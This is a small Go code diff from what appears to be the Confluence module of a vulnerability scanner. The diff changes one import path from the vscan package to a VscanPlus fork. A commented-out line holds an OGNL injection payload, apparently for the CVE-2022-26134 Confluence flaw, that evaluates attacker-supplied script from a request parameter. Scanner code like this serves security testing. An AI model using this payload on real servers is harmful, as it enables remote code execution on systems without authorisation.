@@ -2,7 +2,7 @@ package confluence
 
 import (
 	"fmt"
-	"github.com/veo/vscan/pkg"
+	"github.com/youki992/VscanPlus/pkg"
 )
 
 //var beichen26134 = "${#a=new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter(\"search\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Status\",\"ok\"))}"
